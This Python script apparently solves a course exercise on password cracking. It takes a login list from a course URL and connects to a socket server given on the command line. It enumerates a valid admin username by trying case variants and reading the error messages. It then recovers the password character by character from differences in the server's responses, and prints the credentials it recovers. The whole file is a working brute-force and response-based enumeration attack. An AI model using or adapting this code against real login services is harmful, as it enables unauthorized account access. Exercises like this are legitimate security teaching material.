import argparse
import socket
import itertools
import requests
import string
import json


def get_admin_logins():
    log_str = requests.get('https://stepik.org/media/attachments/lesson/255258/logins.txt').text
    for x in log_str.splitlines():
        yield x


class Connect2Server:

    def __init__(self):
        self.description = "Let's connect to a server."
        self.ip_help = "IP address of the server."
        self.port_help = "Connection port."
        self.message_help = "Message sent to server."
        self.parser = None
        self.args = None
        self.password = ""
        self.logins = get_admin_logins()
        self.login = None
        self.login_success = False
        self.connection_success = False
        self.characters = string.ascii_letters + string.digits
        self.client_socket = None
        self.response = None

    def send_request(self, login, password):
        log_info = json.dumps({'login': login, 'password': password})
        self.client_socket.send(log_info.encode())
        response = json.loads(self.client_socket.recv(1024).decode())
        self.response = response['result']

    def connect(self):
        self.parser = argparse.ArgumentParser(description=self.description)
        self.parser.add_argument('ip_address', help=self.ip_help)
        self.parser.add_argument('port', help=self.port_help)
        self.args = self.parser.parse_args()

        with socket.socket() as self.client_socket:
            self.client_socket.connect((self.args.ip_address, int(self.args.port)))

            while not self.login_success:
                login = next(self.logins)
                log_list = [x.lower() + x.upper() if x.isalpha() else x for x in login]
                log_combinations = itertools.product(*log_list)
                for loc_login in log_combinations:
                    self.send_request("".join(loc_login), self.password)
                    if self.response in ["Wrong password!", "Exception happened during login"]:
                        self.login = "".join(loc_login)
                        self.login_success = True
                        break

            while not self.connection_success:
                for x in self.characters:
                    pw = self.password + x
                    self.send_request(self.login, pw)
                    if self.response != "Wrong password!":
                        self.password = pw
                        if self.response == 'Connection success!':
                            self.connection_success = True
                            print(json.dumps({'login': self.login, 'password': self.password}))
                            return None
                        break


if __name__ == '__main__':
    Connect2Server().connect()
